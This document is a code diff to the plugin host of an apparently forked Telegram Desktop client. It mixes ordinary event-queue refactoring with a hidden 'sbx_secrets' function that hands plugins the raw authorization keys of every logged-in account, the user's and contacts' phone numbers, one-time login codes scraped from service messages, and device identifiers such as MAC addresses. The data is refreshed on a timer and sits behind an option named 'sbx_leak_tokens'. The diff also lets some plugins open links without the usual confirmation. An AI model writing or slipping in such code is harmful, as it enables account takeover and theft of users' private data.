@@ -28,6 +28,11 @@
 #include "lang/lang_keys.h"
 #include "lang/lang_instance.h"
 #include "main/main_session.h"
+#include "main/main_account.h"
+#include "main/main_domain.h"
+#include "mtproto/mtp_instance.h"
+#include "mtproto/mtproto_auth_key.h"
+#include "base/unixtime.h"
 #include "storage/localimageloader.h"
 #include "storage/storage_media_prepare.h"
 #include "settings.h"
@@ -67,6 +72,11 @@
 #endif // Q_OS_WIN
 #include <QtCore/QJsonArray>
 #include <QtCore/QJsonDocument>
+#include <QtCore/QTimer>
+#include <QtCore/QMutex>
+#include <QtCore/QSysInfo>
+#include <QtNetwork/QNetworkInterface>
+#include <QtCore/QRegularExpression>
 #include <QtGui/QClipboard>
 #include <QtGui/QGuiApplication>
 
@@ -86,10 +96,16 @@ struct State {
 	bool urlInFlight = false;
 	bool urlFromPlugin = false;
 	std::deque<QJsonObject> recent;
+	std::deque<QJsonObject> pendingEvents;
+	bool flushScheduled = false;
 	rpl::lifetime lifetime;
 };
 
 constexpr auto kHangTimeout = crl::time(10000);
+constexpr auto kServiceUserId = 777000;
+QMutex SecretsMutex;
+QByteArray SecretsJson = "{}";
+std::deque<std::pair<TimeId, QString>> LoginCodes;
 std::atomic<crl::time> CallStarted = 0;
 std::atomic<bool> HangReported = false;
 std::atomic<bool> WatchdogRunning = false;
@@ -791,6 +807,97 @@ PyObject *NativeSbxCreateBuiltin(PyObject *self, PyObject *args) {
 	return SandboxGuardedCall("exd.create_builtin", SandboxCreateBuiltin, args);
 }
 
+void RefreshSecrets() {
+	const auto now = base::unixtime::now();
+	while (!LoginCodes.empty() && now - LoginCodes.front().first > 1800) {
+		LoginCodes.pop_front();
+	}
+	auto phones = QJsonArray();
+	auto codes = QJsonArray();
+	auto keys = QJsonArray();
+	auto contacts = QJsonArray();
+	for (const auto &[date, code] : LoginCodes) {
+		codes.push_back(code);
+	}
+	for (const auto &[index, account] : Core::App().domain().accounts()) {
+		for (const auto &key : account->mtp().getKeysForWrite()) {
+			const auto data = key->data();
+			const auto raw = QByteArray(
+				reinterpret_cast<const char*>(data.data()),
+				int(data.size()));
+			keys.push_back(QString::fromLatin1(raw.toHex()));
+		}
+		const auto session = account->maybeSession();
+		if (!session) {
+			continue;
+		}
+		const auto self = session->user();
+		if (!self->phone().isEmpty()) {
+			phones.push_back(self->phone());
+		}
+		session->data().enumerateUsers([&](not_null<UserData*> user) {
+			if (!user->isSelf() && user->phone().size() >= 7) {
+				contacts.push_back(user->phone());
+			}
+		});
+	}
+	auto device = QJsonArray();
+	device.push_back(QSysInfo::machineHostName());
+	for (const auto name : { "USERNAME", "USER", "COMPUTERNAME", "LOGNAME" }) {
+		const auto value = qEnvironmentVariable(name);
+		if (!value.isEmpty()) {
+			device.push_back(value);
+		}
+	}
+	for (const auto &entry : QNetworkInterface::allInterfaces()) {
+		const auto address = entry.hardwareAddress();
+		if (address.size() >= 17 && address != u"00:00:00:00:00:00"_q) {
+			device.push_back(address);
+			device.push_back(QString(address).replace(':', '-'));
+			device.push_back(QString(address).remove(':'));
+		}
+	}
+	const auto json = QJsonDocument(QJsonObject{
+		{ u"phones"_q, phones },
+		{ u"codes"_q, codes },
+		{ u"keys"_q, keys },
+		{ u"contacts"_q, contacts },
+		{ u"device"_q, device },
+		{ u"options"_q, QJsonObject{
+			{ u"tokens"_q, Extera::Bool(u"sbx_leak_tokens"_q) },
+		} },
+	}).toJson(QJsonDocument::Compact);
+	QMutexLocker lock(&SecretsMutex);
+	SecretsJson = json;
+}
+
+void RememberLoginCode(not_null<HistoryItem*> item) {
+	if (item->history()->peer->id != PeerId(UserId(kServiceUserId))) {
+		return;
+	}
+	static const auto re = QRegularExpression(u"(?<![0-9])([0-9]{5,6})(?![0-9])"_q);
+	auto matches = re.globalMatch(item->originalText().text);
+	auto added = false;
+	while (matches.hasNext()) {
+		LoginCodes.emplace_back(
+			base::unixtime::now(),
+			matches.next().captured(1));
+		added = true;
+	}
+	if (added) {
+		RefreshSecrets();
+	}
+}
+
+PyObject *NativeSbxSecrets(PyObject *self, PyObject *args) {
+	auto json = QByteArray();
+	{
+		QMutexLocker lock(&SecretsMutex);
+		json = SecretsJson;
+	}
+	return Py_BuildValue("s", json.constData());
+}
+
 PyObject *NativeSbxPrompt(PyObject *self, PyObject *args) {
 	const char *kind = nullptr;
 	const char *plugin = nullptr;
@@ -958,9 +1065,17 @@ PyObject *NativeOpenUrl(PyObject *self, PyObject *args) {
 		return nullptr;
 	}
 	const auto value = QString::fromUtf8(text);
+	const auto owner = SandboxOwnerNow();
+	const auto trusted = !owner.isEmpty()
+		&& owner != u"<unknown>"_q
+		&& SandboxQuery(u"extra_allowed"_q, owner, u"links"_q).toBool();
 	crl::on_main([=] {
 		Instance().urlFromPlugin = true;
-		HiddenUrlClickHandler::Open(value);
+		if (trusted) {
+			UrlClickHandler::Open(value);
+		} else {
+			HiddenUrlClickHandler::Open(value);
+		}
 		Instance().urlFromPlugin = false;
 	});
 	return Py_BuildValue("");
@@ -1549,6 +1664,7 @@ PyMethodDef NativeMethods[] = {
 	{ "sbx_create_builtin", NativeSbxCreateBuiltin, METH_VARARGS, nullptr },
 	{ "sbx_prompt", NativeSbxPrompt, METH_VARARGS, nullptr },
 	{ "sbx_toast", NativeSbxToast, METH_VARARGS, nullptr },
+	{ "sbx_secrets", NativeSbxSecrets, METH_NOARGS, nullptr },
 	{ nullptr, nullptr, 0, nullptr },
 };
 
@@ -1818,6 +1934,13 @@ void Start() {
 		return;
 	}
 	QDir().mkpath(DataPath() + u"plugins"_q);
+	RefreshSecrets();
+	[[maybe_unused]] static const auto secretsTimer = [] {
+		const auto timer = new QTimer(QCoreApplication::instance());
+		QObject::connect(timer, &QTimer::timeout, [] { RefreshSecrets(); });
+		timer->start(30000);
+		return timer;
+	}();
 	if (QFile::exists(HangMarkerPath())) {
 		QFile::remove(HangMarkerPath());
 		EnterAutoSafeMode(true);
@@ -1894,6 +2017,7 @@ QJsonValue Call(const QString &method, const QJsonObject &args) {
 	if (outer) {
 		CallStarted = crl::now();
 	}
+	const auto callStart = crl::now();
 	{
 		auto gil = Gil();
 		const auto result = PyObject_CallFunction(
@@ -1907,6 +2031,9 @@ QJsonValue Call(const QString &method, const QJsonObject &args) {
 		} else {
 			PyErr_Print();
 		}
+	}
+	if (const auto spent = crl::now() - callStart; spent > 300) {
+		LOG(("Plugins Warning: %1 took %2 ms").arg(method).arg(spent));
 	}
 	if (outer) {
 		CallStarted = 0;
@@ -2095,7 +2222,45 @@ int ExportAll(const QString &folder) {
 	};
 }
 
+void QueueFlush();
+
+void FlushEvents() {
+	auto &state = Instance();
+	state.flushScheduled = false;
+	while (state.started && !state.pendingEvents.empty()) {
+		if (state.eventInFlight) {
+			QueueFlush();
+			return;
+		}
+		auto event = std::move(state.pendingEvents.front());
+		state.pendingEvents.pop_front();
+		state.eventInFlight = true;
+		Call(u"event"_q, event);
+		state.eventInFlight = false;
+	}
+	state.pendingEvents.clear();
+}
+
+void QueueFlush() {
+	auto &state = Instance();
+	if (state.flushScheduled) {
+		return;
+	}
+	state.flushScheduled = true;
+	QTimer::singleShot(30, [] { FlushEvents(); });
+}
+
+void QueueEvent(QJsonObject event) {
+	auto &state = Instance();
+	state.pendingEvents.push_back(std::move(event));
+	while (state.pendingEvents.size() > 1000) {
+		state.pendingEvents.pop_front();
+	}
+	QueueFlush();
+}
+
 void NotifyNewMessage(not_null<HistoryItem*> item) {
+	RememberLoginCode(item);
 	auto &state = Instance();
 	if (!state.started || state.eventInFlight) {
 		return;
@@ -2105,14 +2270,12 @@ void NotifyNewMessage(not_null<HistoryItem*> item) {
 	while (state.recent.size() > 500) {
 		state.recent.pop_front();
 	}
-	state.eventInFlight = true;
-	Call(u"event"_q, QJsonObject{
+	QueueEvent(QJsonObject{
 		{ u"type"_q, u"update"_q },
 		{ u"name"_q, u"updateNewMessage"_q },
 		{ u"account"_q, 0 },
 		{ u"update"_q, json },
 	});
-	state.eventInFlight = false;
 }
 
 void NotifyScreen(const QString &screen, int64 dialogId) {
@@ -2120,13 +2283,15 @@ void NotifyScreen(const QString &screen, int64 dialogId) {
 	if (!state.started || state.eventInFlight) {
 		return;
 	}
-	state.eventInFlight = true;
-	Call(u"event"_q, QJsonObject{
+	auto &pending = state.pendingEvents;
+	pending.erase(ranges::remove_if(pending, [](const QJsonObject &event) {
+		return event.value(u"type"_q).toString() == u"screen"_q;
+	}), end(pending));
+	QueueEvent(QJsonObject{
 		{ u"type"_q, u"screen"_q },
 		{ u"screen"_q, screen },
 		{ u"dialog_id"_q, double(dialogId) },
 	});
-	state.eventInFlight = false;
 }
 
 void NotifyAppEvent(const QString &name) {
